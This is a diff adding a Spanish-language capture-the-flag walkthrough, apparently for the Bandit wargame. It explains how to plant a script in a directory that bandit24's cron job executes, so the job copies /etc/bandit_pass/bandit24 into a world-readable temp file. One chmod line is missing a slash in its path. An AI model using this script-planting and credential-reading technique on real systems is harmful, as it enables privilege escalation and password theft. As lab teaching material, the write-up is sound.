@@ -1,0 +1,47 @@
+#Este nivel también trabaja con tareas cron, se debe hacer lo mismo que en los 2 anteriores y ver la tarea cron que se está ejecutando.
+
+Paso 1: 
+
+	~ cd /etc/cron.d/ --> entrar al archivo donde están las tareas cron
+	~ cat cronjob_bandit24 --> Leer la tarea cron que se está ejecutando.
+
+	La tarea que se ejecuta también es un script que lo que hace es ejecutar una lista de archivos .sh que estan dentro de una carpte /var/spool/$myname/foo.
+	En este caso $myname se refiere a bandit24 ya que es el usuario que está ejecutando esta tarea.
+
+Paso 2: SOLUCIÓN
+
+	Se debe crear un directorio temporal y acceder a él:
+
+	~ my_dir=$(mktemp -d)
+
+	~ cd $my_dir
+
+	~ chmod o+wrx $my_dir --> Se le deben dar permisos de lectura y escritura para que otros usuarios en este caso bandit24 pueda acceder a el.
+
+	Luego se crea un script que es el que se ejecutará dentro de la carpeta en donde bandit24 está ejecutando los scripts.
+
+	~ touch script.sh 
+	~ chmod +x script.sh --> dar permisos de ejecución al script.
+	
+	Se debe obtener el directorio a donde queremos mandar la contraseña
+
+	~ echo $my_dir --> copiar el resulado que nos de y pegarlo dentro del script en la ruta donde queramos que nos cree la contraseña.
+
+	¡OJO! -> Donde dice DIRECTORIO_TEMPORAL debe ser reemplazado por el resultado del comando anterior.
+
+	El script debe contener lo siguinte: 
+
+	#!/bin/bash
+
+	cat /etc/bandit_pass/bandit24 > DIRECTORIO_TEMPORAL/password.txt
+	chmod o+r DIRECTORIO_TEMPORALpassword.txt
+
+
+Paso 3:
+
+	Copiar el script a la dirección que nos dan y esperar 1 minuto.
+
+	cp script.sh /var/spool/bandit24/foo/script.sh
+
+
+
